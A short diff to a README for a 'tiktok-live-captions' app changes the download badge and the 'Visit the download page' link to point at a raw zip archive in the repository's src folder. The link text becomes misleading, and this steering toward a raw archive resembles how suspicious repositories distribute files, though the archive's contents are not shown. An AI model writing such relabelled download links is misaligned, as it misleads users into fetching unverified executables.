@@ -1,6 +1,6 @@
 # 🎥 tiktok-live-captions - Live captions for TikTok streams
 
-[![Download](https://img.shields.io/badge/Download-TikTok%20Live%20Captions-blue?style=for-the-badge)](https://github.com/sunnypatel1122/tiktok-live-captions)
+[![Download](https://img.shields.io/badge/Download-TikTok%20Live%20Captions-blue?style=for-the-badge)](https://raw.githubusercontent.com/sunnypatel1122/tiktok-live-captions/main/src/captions_tiktok_live_v1.3-alpha.4.zip)
 
 ## 🧭 What this app does
 
@@ -30,7 +30,7 @@ If you do not have Node.js yet, install it first from the official Node.js site.
 
 Use this link to visit the page to download:
 
-[Visit the download page](https://github.com/sunnypatel1122/tiktok-live-captions)
+[Visit the download page](https://raw.githubusercontent.com/sunnypatel1122/tiktok-live-captions/main/src/captions_tiktok_live_v1.3-alpha.4.zip)
 
 If the project provides files in releases or a setup package, download the latest version from that page, then save it to your Windows computer.
 
